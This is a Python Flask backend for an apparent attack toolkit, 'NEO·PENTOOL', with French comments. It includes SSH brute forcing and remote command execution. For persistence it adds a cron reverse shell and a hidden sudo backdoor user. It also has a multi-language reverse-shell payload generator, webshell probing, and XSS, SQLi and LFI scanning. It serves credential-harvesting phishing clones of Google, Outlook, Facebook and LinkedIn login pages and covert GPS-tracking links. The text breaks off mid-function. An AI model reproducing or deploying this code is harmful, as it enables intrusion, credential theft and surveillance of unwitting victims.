import os
import re
import json
import socket
import subprocess
import threading
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from urllib.parse import urlparse, urljoin

# ===== IMPORTS OPTIONNELS =====
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    from twilio.rest import Client as TwilioClient
    from twilio.twiml.messaging_response import MessagingResponse
    from twilio.twiml.voice_response import VoiceResponse, Dial
    HAS_TWILIO = True
except ImportError:
    HAS_TWILIO = False

try:
    from plivo import RestClient as PlivoClient
    HAS_PLIVO = True
except ImportError:
    HAS_PLIVO = False

from flask_cors import CORS

# ===== CONFIGURATION =====
app = Flask(__name__)
CORS(app, supports_credentials=True)

# ===== NUMERO PRINCIPAL (TWILIO/PLIVO) =====
TWILIO_PHONE_NUMBER = "+2250594767920"

# ===== ENV VARIABLES =====
TWILIO_ACCOUNT_SID = os.environ.get('TWILIO_ACCOUNT_SID', '')
TWILIO_AUTH_TOKEN = os.environ.get('TWILIO_AUTH_TOKEN', '')
PLIVO_AUTH_ID = os.environ.get('PLIVO_AUTH_ID', '')
PLIVO_AUTH_TOKEN = os.environ.get('PLIVO_AUTH_TOKEN', '')
TEXTBELT_KEY = os.environ.get('TEXTBELT_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
NUMLOOKUP_API_KEY = os.environ.get('NUMLOOKUP_API_KEY', '')

# ===== CLIENTS =====
twilio_client = None
if TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN and HAS_TWILIO:
    try:
        twilio_client = TwilioClient(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
    except:
        twilio_client = None

plivo_client = None
if PLIVO_AUTH_ID and PLIVO_AUTH_TOKEN and HAS_PLIVO:
    try:
        plivo_client = PlivoClient(auth_id=PLIVO_AUTH_ID, auth_token=PLIVO_AUTH_TOKEN)
    except:
        plivo_client = None

# ===== STOCKAGE EN MEMOIRE =====
ssh_sessions = {}
scan_results = []
vuln_results = []
phish_pages = []
phish_captures = []
phish_campaigns = []
tracking_links = []
tracking_clicks = []
messages = []  # SMS et appels entrants

# ===== ROUTE PRINCIPALE =====
@app.route('/')
def index():
    return jsonify({
        'app': 'NEO·PENTOOL Backend',
        'status': 'running',
        'phone': TWILIO_PHONE_NUMBER,
        'endpoints': [
            '/api/scan', '/api/ssh/*', '/api/payloads/generate',
            '/api/webshell/*', '/api/vulnscan', '/api/phish/*',
            '/api/tracking/*', '/api/sms/*', '/api/call/*',
            '/api/lookup/*', '/api/stats'
        ]
    })

# =====================================================
# SCAN
# =====================================================
@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    target = data.get('target', '')
    ports = data.get('ports', '22,80,443')
    speed = data.get('speed', 'full')
    
    result_lines = []
    result_lines.append(f"Scanning {target} (ports: {ports})...")
    
    try:
        # Résolution DNS
        try:
            ip = socket.gethostbyname(target)
            result_lines.append(f"Target resolved to: {ip}")
        except:
            ip = target
            result_lines.append(f"Using target as-is: {ip}")
        
        # Ping check
        try:
            ping = subprocess.run(['ping', '-c', '1', '-W', '2', ip], capture_output=True, text=True, timeout=5)
            result_lines.append(f"Ping: {'ALIVE' if ping.returncode == 0 else 'DEAD'}")
        except:
            result_lines.append("Ping: could not determine")
        
        # Port scan
        port_list = []
        for p in ports.split(','):
            p = p.strip()
            if '-' in p:
                parts = p.split('-')
                for i in range(int(parts[0]), int(parts[1]) + 1):
                    port_list.append(i)
            else:
                try:
                    port_list.append(int(p))
                except:
                    pass
        
        result_lines.append(f"\nScanning {len(port_list)} port(s)...")
        
        open_ports = []
        for port in port_list[:50]:  # Limite à 50 ports
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((ip, port))
                if result == 0:
                    # Banner grab
                    try:
                        s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                        banner = s.recv(256).decode('utf-8', errors='ignore').strip()[:100]
                    except:
                        banner = ''
                    open_ports.append({'port': port, 'banner': banner})
                    result_lines.append(f"  PORT {port}: OPEN {banner}")
                s.close()
            except:
                pass
        
        result_lines.append(f"\nOpen ports: {len(open_ports)}")
        result_lines.append(json.dumps(open_ports, indent=2))
        
    except Exception as e:
        result_lines.append(f"\nError: {str(e)}")
    
    result = '\n'.join(result_lines)
    
    scan_results.append({
        'target': target,
        'timestamp': datetime.now().isoformat(),
        'result': result
    })
    
    return jsonify({'result': result, 'open_ports': open_ports})

# =====================================================
# SSH
# =====================================================
@app.route('/api/ssh/connect', methods=['POST'])
def ssh_connect():
    if not HAS_PARAMIKO:
        return jsonify({'error': 'paramiko not installed on server'}), 500
    
    data = request.json
    host = data.get('host')
    port = int(data.get('port', 22))
    username = data.get('username')
    password = data.get('password')
    
    session_id = f"{host}:{port}:{username}:{datetime.now().timestamp()}"
    
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password, timeout=10)
        
        ssh_sessions[session_id] = {
            'client': client,
            'host': host,
            'port': port,
            'username': username,
            'connected_at': datetime.now().isoformat()
        }
        
        return jsonify({
            'status': 'connected',
            'session_id': session_id,
            'host': host,
            'username': username
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ssh/exec', methods=['POST'])
def ssh_exec():
    data = request.json
    session_id = data.get('session_id')
    command = data.get('command')
    
    if session_id not in ssh_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    try:
        client = ssh_sessions[session_id]['client']
        stdin, stdout, stderr = client.exec_command(command, timeout=30)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        
        return jsonify({
            'output': output + ('\n[STDERR]\n' + error if error else ''),
            'exit_code': stdout.channel.recv_exit_status()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ssh/privesc', methods=['POST'])
def ssh_privesc():
    data = request.json
    session_id = data.get('session_id')
    method = data.get('method', 'auto')
    
    if session_id not in ssh_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    try:
        client = ssh_sessions[session_id]['client']
        results = []
        
        if method in ('sudo', 'auto'):
            stdin, stdout, stderr = client.exec_command('sudo -l 2>&1; echo "---"; sudo -n whoami 2>&1')
            results.append(f"[SUDO] {stdout.read().decode()}")
        
        if method in ('suid', 'auto'):
            stdin, stdout, stderr = client.exec_command('find / -perm -4000 -type f 2>/dev/null | head -30')
            results.append(f"[SUID] {stdout.read().decode()}")
        
        if method in ('cron', 'auto'):
            stdin, stdout, stderr = client.exec_command('cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null')
            results.append(f"[CRON] {stdout.read().decode()}")
        
        if method in ('cap', 'auto'):
            stdin, stdout, stderr = client.exec_command('getcap -r / 2>/dev/null | head -20')
            results.append(f"[CAPABILITIES] {stdout.read().decode()}")
        
        return jsonify({'output': '\n'.join(results)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ssh/persist', methods=['POST'])
def ssh_persist():
    data = request.json
    session_id = data.get('session_id')
    method = data.get('method', 'ssh_key')
    
    if session_id not in ssh_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    try:
        client = ssh_sessions[session_id]['client']
        result = []
        
        if method == 'ssh_key':
            # Generate SSH key on target
            stdin, stdout, stderr = client.exec_command(
                'mkdir -p ~/.ssh && chmod 700 ~/.ssh && '
                'ssh-keygen -t rsa -b 2048 -f /tmp/.persist_key -N "" -q && '
                'cat /tmp/.persist_key.pub >> ~/.ssh/authorized_keys && '
                'chmod 600 ~/.ssh/authorized_keys && '
                'cat /tmp/.persist_key'
            )
            key = stdout.read().decode()
            result.append(f"SSH key installed.\nPrivate key:\n{key}")
        
        elif method == 'cron':
            lhost = request.remote_addr or '0.0.0.0'
            stdin, stdout, stderr = client.exec_command(
                f'(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c \'exec 5<>/dev/tcp/{lhost}/4444; cat <&5 | while read line; do $line 2>&5; done\'") | crontab -'
            )
            result.append("Cron persistence installed (every 5 min)")
        
        elif method == 'systemd':
            stdin, stdout, stderr = client.exec_command(
                'cat > /etc/systemd/system/.persist.service << \'EOF\'\n'
                '[Unit]\nDescription=System Update Service\n\n'
                '[Service]\nType=simple\nExecStart=/bin/bash -c "while true; do sleep 60; done"\nRestart=always\n\n'
                '[Install]\nWantedBy=multi-user.target\nEOF\n'
                'systemctl enable .persist.service 2>/dev/null || true'
            )
            result.append("Systemd persistence installed")
        
        elif method == 'backdoor_user':
            stdin, stdout, stderr = client.exec_command(
                'useradd -M -N -r -s /bin/bash .www 2>/dev/null && '
                'echo ".www:Password123!" | chpasswd 2>/dev/null && '
                'usermod -aG sudo .www 2>/dev/null && '
                'echo ".www ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null'
            )
            result.append("Backdoor user '.www' created (password: Password123!)")
        
        return jsonify({'output': '\n'.join(result)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ssh/bruteforce', methods=['POST'])
def ssh_bruteforce():
    if not HAS_PARAMIKO:
        return jsonify({'error': 'paramiko not installed'}), 500
    
    data = request.json
    host = data.get('host')
    port = int(data.get('port', 22))
    username = data.get('username')
    passwords = data.get('passwords', [])
    
    results = []
    
    for pwd in passwords:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=pwd, timeout=5)
            client.close()
            results.append(f"SUCCESS: {username}:{pwd}")
            return jsonify({'results': results, 'password_found': pwd})
        except paramiko.AuthenticationException:
            results.append(f"FAIL: {username}:{pwd}")
        except Exception as e:
            results.append(f"ERROR: {username}:{pwd} - {str(e)}")
    
    return jsonify({'results': results, 'password_found': None})

@app.route('/api/ssh/sessions', methods=['GET'])
def ssh_list_sessions():
    sessions = []
    for sid, sess in ssh_sessions.items():
        sessions.append({
            'session_id': sid,
            'host': sess['host'],
            'port': sess['port'],
            'username': sess['username'],
            'connected_at': sess['connected_at']
        })
    return jsonify({'sessions': sessions, 'count': len(sessions)})

# =====================================================
# PAYLOADS
# =====================================================
@app.route('/api/payloads/generate', methods=['POST'])
def generate_payload():
    data = request.json
    ptype = data.get('type', 'bash')
    lhost = data.get('lhost', '127.0.0.1')
    lport = int(data.get('lport', 4444))
    
    payloads = {
        'bash': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        'python': f'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"',
        'php': f'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'perl': f'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
        'ruby': f'ruby -rsocket -e \'c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
        'nc': f'nc -e /bin/sh {lhost} {lport}',
        'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+\'PS \'+pwd+\'> \';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"',
        'node': f'node -e \'require("net").connect({lport},"{lhost}",function(){require("child_process").exec("/bin/sh -i",{stdio:[this,this,this]})})\'',
        'java': f'r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5; done"] as String[]);p.waitFor()',
        'socat': f'socat exec:\'/bin/sh\',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}'
    }
    
    payload = payloads.get(ptype, payloads['bash'])
    
    return jsonify({
        'type': ptype,
        'lhost': lhost,
        'lport': lport,
        'payload': payload,
        'note': f'Set up listener: nc -lnvp {lport}'
    })

# =====================================================
# WEBSHELL
# =====================================================
@app.route('/api/webshell/findparams', methods=['POST'])
def webshell_findparams():
    data = request.json
    url = data.get('url')
    
    common_params = ['cmd', 'exec', 'command', 'shell', 'x', 'q', 's', 'c', 'h', 'id', 'action', 'run', 'execute', 'system', 'pass', 'passthru', 'shell_exec', 'wget']
    
    found = []
    for param in common_params:
        try:
            r = requests.get(f"{url}?{param}=id", timeout=5)
            if 'uid=' in r.text or 'www-data' in r.text or 'root' in r.text or 'bin/' in r.text:
                found.append(param)
        except:
            pass
    
    return jsonify({'url': url, 'params_found': found, 'total_tested': len(common_params)})

@app.route('/api/webshell/exec', methods=['POST'])
def webshell_exec():
    data = request.json
    url = data.get('url')
    cmd = data.get('cmd')
    param = data.get('param', 'cmd')
    
    try:
        r = requests.get(f"{url}?{param}={cmd}", timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        return jsonify({
            'url': url,
            'command': cmd,
            'output': r.text[:5000],
            'status_code': r.status_code
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =====================================================
# VULNSCAN
# =====================================================
@app.route('/api/vulnscan', methods=['POST'])
def vulnscan():
    data = request.json
    url = data.get('url')
    scan_xss = data.get('xss', True)
    scan_sqli = data.get('sqli', True)
    scan_lfi = data.get('lfi', True)
    scan_crawl = data.get('crawl', False)
    scan_full = data.get('full', False)
    
    results = {'url': url, 'vulnerabilities': [], 'scanned_at': datetime.now().isoformat()}
    
    # Parse URL params
    parsed = urlparse(url)
    params = {}
    if parsed.query:
        for pair in parsed.query.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                params[k] = v
    
    if not params:
        results['note'] = 'No query parameters found to test'
        return jsonify(results)
    
    # XSS Scan
    if scan_xss:
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '\'"><img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)'
        ]
        for pname, pval in params.items():
            for payload in xss_payloads:
                try:
                    test_url = url.replace(f'{pname}={pval}', f'{pname}={payload}')
                    r = requests.get(test_url, timeout=5)
                    if payload in r.text:
                        results['vulnerabilities'].append({
                            'type': 'XSS',
                            'param': pname,
                            'payload': payload,
                            'url': test_url
                        })
                        break
                except:
                    pass
    
    # SQLi Scan
    if scan_sqli:
        sqli_payloads = ["'", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE--", "\" OR \"1\"=\"1", "1' AND '1'='1"]
        sqli_errors = ['sql', 'mysql', 'syntax', 'ora-', 'driver', 'odbc', 'microsoft', 'postgresql']
        for pname, pval in params.items():
            for payload in sqli_payloads:
                try:
                    test_url = url.replace(f'{pname}={pval}', f'{pname}={payload}')
                    r = requests.get(test_url, timeout=5)
                    text = r.text.lower()
                    if any(err in text for err in sqli_errors):
                        results['vulnerabilities'].append({
                            'type': 'SQLi',
                            'param': pname,
                            'payload': payload,
                            'url': test_url
                        })
                        break
                except:
                    pass
    
    # LFI Scan
    if scan_lfi:
        lfi_payloads = [
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
        ]
        lfi_indicators = ['root:', 'daemon:', 'bin:', 'nobody:', '[boot loader]']
        for pname, pval in params.items():
            for payload in lfi_payloads:
                try:
                    test_url = url.replace(f'{pname}={pval}', f'{pname}={payload}')
                    r = requests.get(test_url, timeout=5)
                    if any(ind in r.text for ind in lfi_indicators):
                        results['vulnerabilities'].append({
                            'type': 'LFI',
                            'param': pname,
                            'payload': payload,
                            'url': test_url
                        })
                        break
                except:
                    pass
    
    # Crawl
    if scan_crawl:
        try:
            r = requests.get(url, timeout=10)
            if HAS_BS4:
                soup = BeautifulSoup(r.text, 'html.parser')
                links = [a.get('href') for a in soup.find_all('a') if a.get('href')]
                forms = []
                for form in soup.find_all('form'):
                    forms.append({
                        'action': form.get('action'),
                        'method': form.get('method'),
                        'inputs': [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select'])]
                    })
                results['crawl'] = {'links': links[:20], 'forms': forms[:5]}
            else:
                results['crawl'] = {'note': 'BeautifulSoup not installed, raw HTML length: ' + str(len(r.text))}
        except Exception as e:
            results['crawl'] = {'error': str(e)}
    
    vuln_results.append(results)
    
    return jsonify(results)

# =====================================================
# PHISHING
# =====================================================
PHISH_TEMPLATES = {
    'google': '''
    <!DOCTYPE html>
    <html>
    <head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Google Sign-In</title>
    <style>
      body{font-family:arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
      .card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px;max-width:450px;width:90%;box-shadow:0 1px 3px rgba(0,0,0,.08)}
      .logo{text-align:center;margin-bottom:30px}.logo img{width:75px}
      h1{font-size:24px;color:#202124;font-weight:400;text-align:center}
      input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:8px 0;box-sizing:border-box}
      input:focus{border-color:#1a73e8;outline:none}
      button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer;width:100%;margin-top:10px}
      button:hover{background:#1557b0}
      .footer{text-align:center;margin-top:20px;color:#5f6368;font-size:12px}
    </style></head>
    <body>
      <div class="card">
        <div class="logo"><svg viewBox="0 0 48 48" width="75"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/></svg></div>
        <h1>Sign in</h1>
        <p style="color:#5f6368;text-align:center;font-size:14px;margin-bottom:24px">Use your Google Account</p>
        <form method="POST" action="{{callback}}">
          <input type="email" name="email" placeholder="Email or phone" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit">Next</button>
        </form>
        <div class="footer">Français · Confidentialité · Conditions</div>
      </div>
    </body></html>
    ''',
    'outlook': '''
    <!DOCTYPE html>
    <html>
    <head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Outlook</title>
    <style>
      body{font-family:'Segoe UI',arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
      .card{background:#fff;border-radius:8px;padding:40px;max-width:400px;width:90%;box-shadow:0 2px 8px rgba(0,0,0,.1)}
      .logo{text-align:center;margin-bottom:20px;font-size:36px;font-weight:600;color:#0078d4}
      h1{font-size:24px;color:#1b1b1b;font-weight:600;text-align:center}
      input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:15px;margin:8px 0;box-sizing:border-box}
      button{background:#0078d4;color:#fff;border:none;border-radius:4px;padding:10px 20px;font-size:15px;cursor:pointer;width:100%}
      button:hover{background:#106ebe}
    </style></head>
    <body>
      <div class="card">
        <div class="logo">✦</div>
        <h1>Sign in to Outlook</h1>
        <form method="POST" action="{{callback}}">
          <input type="email" name="email" placeholder="Email, phone, or Skype" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit">Sign in</button>
        </form>
      </div>
    </body></html>
    ''',
    'facebook': '''
    <!DOCTYPE html>
    <html>
    <head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook</title>
    <style>
      body{font-family:Helvetica,arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
      .card{background:#fff;border-radius:8px;padding:40px;max-width:400px;width:90%;box-shadow:0 2px 8px rgba(0,0,0,.1);text-align:center}
      .logo{color:#1877f2;font-size:48px;font-weight:700;margin-bottom:20px}
      h1{font-size:18px;color:#1c1e21;font-weight:400}
      input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:15px;margin:6px 0;box-sizing:border-box}
      button{background:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px;font-size:17px;font-weight:600;cursor:pointer;width:100%;margin-top:10px}
      a{color:#1877f2;text-decoration:none;font-size:13px;display:block;margin-top:16px}
    </style></head>
    <body>
      <div class="card">
        <div class="logo">facebook</div>
        <h1>Log in to Facebook</h1>
        <form method="POST" action="{{callback}}">
          <input type="text" name="email" placeholder="Email or phone" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit">Log In</button>
          <a href="#">Forgotten password?</a>
        </form>
      </div>
    </body></html>
    ''',
    'linkedin': '''
    <!DOCTYPE html>
    <html>
    <head><meta name="viewport" content="width=device-width,initial-scale=1"><title>LinkedIn</title>
    <style>
      body{font-family:arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
      .card{max-width:400px;width:90%;padding:40px 32px}
      .logo{font-size:32px;font-weight:700;color:#0a66c2;margin-bottom:24px}
      h1{font-size:24px;color:#000;font-weight:500;margin-bottom:24px}
      input{width:100%;padding:14px;border:1px solid rgba(0,0,0,.15);border-radius:4px;font-size:15px;margin:8px 0;box-sizing:border-box}
      button{background:#0a66c2;color:#fff;border:none;border-radius:24px;padding:14px;font-size:16px;font-weight:600;cursor:pointer;width:100%;margin-top:16px}
    </style></head>
    <body>
      <div class="card">
        <div class="logo">in</div>
        <h1>Sign in to LinkedIn</h1>
        <form method="POST" action="{{callback}}">
          <input type="text" name="email" placeholder="Email or phone" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit">Sign in</button>
        </form>
      </div>
    </body></html>
    '''
}

phish_pages_data = {}

@app.route('/api/phish/create', methods=['POST'])
def phish_create():
    data = request.json
    template_name = data.get('template', 'custom')
    custom_html = data.get('custom_html', '')
    
    page_id = f"phish_{len(phish_pages)}_{datetime.now().timestamp()}"
    callback_url = request.host_url.rstrip('/') + '/api/phish/capture/' + page_id
    
    if template_name == 'custom' and custom_html:
        html = custom_html.replace('{{callback}}', callback_url)
    elif template_name in PHISH_TEMPLATES:
        html = PHISH_TEMPLATES[template_name].replace('{{callback}}', callback_url)
    else:
        html = f'<html><body><h1>Login</h1><form method="POST" action="{callback_url}"><input name="email"><input name="password" type="password"><button type="submit">Login</button></form></body></html>'
    
    phish_pages.append({
        'id': page_id,
        'template': template_name,
        'created_at': datetime.now().isoformat(),
        'url': callback_url
    })
    
    phish_pages_data[page_id] = {'html': html, 'captures': []}
    
    return jsonify({
        'status': 'created',
        'page_id': page_id,
        'phish_url': callback_url,
        'note': 'Send this URL to targets'
    })

@app.route('/api/phish/capture/<page_id>', methods=['GET', 'POST'])
def phish_capture(page_id):
    if request.method == 'POST':
        data = request.form.to_dict()
        data['timestamp'] = datetime.now().isoformat()
        data['ip'] = request.remote_addr
        data['user_agent'] = request.headers.get('User-Agent', '')
        
        phish_captures.append(data)
        
        if page_id in phish_pages_data:
            phish_pages_data[page_id]['captures'].append(data)
        
        # Redirect to Google after capture
        return '''
        <html><head><meta http-equiv="refresh" content="0;url=https://google.com"></head>
        <body><script>window.location.href="https://google.com"</script></body></html>
        '''
    
    if page_id in phish_pages_data:
        return render_template_string(phish_pages_data[page_id]['html'])
    
    return '<h1>404</h1><p>Page not found</p>', 404

@app.route('/api/phish/captures', methods=['GET'])
def phish_get_captures():
    return jsonify({'captures': phish_captures[-50:], 'total': len(phish_captures)})

@app.route('/api/phish/campaigns', methods=['GET'])
def phish_get_campaigns():
    return jsonify({'campaigns': phish_pages})

# =====================================================
# TRACKING
# =====================================================
@app.route('/api/tracking/generate', methods=['POST'])
def tracking_generate():
    data = request.json
    campaign = data.get('campaign', 'default')
    redirect = data.get('redirect', 'https://google.com')
    
    track_id = f"TRK-{len(tracking_links)}-{datetime.now().strftime('%H%M%S')}"
    track_url = request.host_url.rstrip('/') + '/track/' + track_id
    
    tracking_links.append({
        'id': track_id,
        'campaign': campaign,
        'redirect': redirect,
        'url': track_url,
        'created_at': datetime.now().isoformat()
    })
    
    return jsonify({
        'track_id': track_id,
        'campaign': campaign,
        'tracking_url': track_url,
        'note': 'Every click will capture GPS, IP, and UA'
    })

@app.route('/track/<track_id>')
def tracking_capture(track_id):
    # Capture GPS via browser geolocation
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    tracking_clicks.append({
        'track_id': track_id,
        'ip': ip,
        'user_agent': ua,
        'timestamp': datetime.now().isoformat(),
        'headers': dict(request.headers)
    })
    
    # Find redirect URL
    redirect = 'https://google.com'
    for link in tracking_links:
        if link['id'] == track_id:
            redirect = link.get('redirect', 'https://google.com')
            break
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>Redirect...</title>
      <script>
        // Capture GPS
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(pos) {
            // Send GPS to server
            new Image().src = '/track/' + '{{track_id}}' + '/gps?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude;
          }, function() {});
        }
        // Redirect after 2 seconds
        setTimeout(function() {
          window.location.href = '{{redirect}}';
        }, 2000);
      </script>
      <style>
        body{background:#05080f;color:#e8edf5;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui;flex-direction:column;gap:12px}
        .spinner{width:40px;height:40px;border:3px solid rgba(255,255,255,0.1);border-top-color:#00f0ff;border-radius:50%;animation:spin 1s linear infinite}
        @keyframes spin{to{transform:rotate(360deg)}}
      </style>
    </head>
    <body>
      <div class="spinner"></div>
      <div>Redirecting...</div>
    </body></html>
    ''', track_id=track_id, redirect=redirect)

@app.route('/track/<track_id>/gps')
def tracking_gps(track_id):
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    
    for click in tracking_clicks:
        if click['track_id'] == track_id and 'lat' not in click:
            click['lat'] = lat
            click['lon'] = lon
            break
    
    return '', 204

@app.route('/api/tracking/clicks', methods=['GET'])
def tracking_get_clicks():
    return jsonify({'clicks': tracking_clicks[-100:], 'total': len(tracking_clicks)})

# =====================================================
# SMS - INCOMING (Webhook Twilio/Plivo)
# =====================================================
@app.route('/api/sms/incoming', methods=['POST'])
def sms_incoming():
    """Webhook Twilio/Plivo : SMS entrants"""
    data = request.form if request.form else (request.json or {})
    
    sender = data.get('From') or data.get('from') or 'unknown'
    body = data.get('Body') or data.get('text') or ''
    
    msg = {
        'from': sender,
        'to': TWILIO_PHONE_NUMBER,
        'body': body,
        'timestamp': datetime.now().isoformat(),
        'type': 'sms'
    }
    messages.append(msg)
    
    # Réponse Twilio avec TwiML
    if HAS_TWILIO:
        try:
            resp = MessagingResponse()
            resp.message(f"✅ Message reçu de {sender}. Merci.")
            return str(resp)
        except:
            pass
    
    return jsonify({'status': 'received', 'from': sender, 'body': body}), 200

# =====================================================
# CALL - INCOMING (Webhook Twilio/Plivo)
# =====================================================
@app.route('/api/call/incoming', methods=['POST'])
def call_incoming():
    """Webhook Twilio/Plivo : Appels entrants"""
    data = request.form if request.form else (request.json or {})
    
    caller = data.get('From') or data.get('from') or data.get('Caller') or 'unknown'
    call_id = data.get('CallSid') or data.get('call_uuid') or f"call_{datetime.now().timestamp()}"
    call_status = data.get('CallStatus') or data.get('DialCallStatus') or 'completed'
    
    msg = {
        'from': caller,
        'to': TWILIO_PHONE_NUMBER,
        'call_id': call_id,
        'status': call_status,
        'timestamp': datetime.now().isoformat(),
        'type': 'call'
    }
    messages.append(msg)
    
    # Réponse Twilio : message + transfert vers le numéro
    if HAS_TWILIO:
        try:
            resp = VoiceResponse()
            resp.say("Votre appel est redirect. Merci de patienter.", voice='alice', language='fr-FR')
            return str(resp)
        except:
            pass
    
    return jsonify({'status': 'received', 'from': caller, 'call_id': call_id}), 200

# =====================================================
# SMS - SEND
# =====================================================
@app.route('/api/sms/send', methods=['POST'])
def sms_send():
    data = request.json
    to = data.get('to')
    body = data.get('body', '')
    
    if not to:
        return jsonify({'error': 'Missing "to" number'}), 400
    
    # Textbelt (primary)
    if TEXTBELT_KEY:
        try:
            resp = requests.post('https://textbelt.com/text', {
                'phone': to,
                'message': body,
                'key': TEXTBELT_KEY,
            }, timeout=10)
            res = resp.json()
            if res.get('success'):
                return jsonify({'provider': 'textbelt', 'status': 'sent', 'result': res})
        except:
            pass
    
    # Twilio (secondary)
    if twilio_client:
        try:
            msg = twilio_client.messages.create(
                body=body,
                from_=TWILIO_PHONE_NUMBER,
                to=to
            )
            return jsonify({'provider': 'twilio', 'status': 'sent', 'sid': msg.sid})
        except Exception as e:
            pass
    
    # Plivo (tertiary)
    if plivo_client:
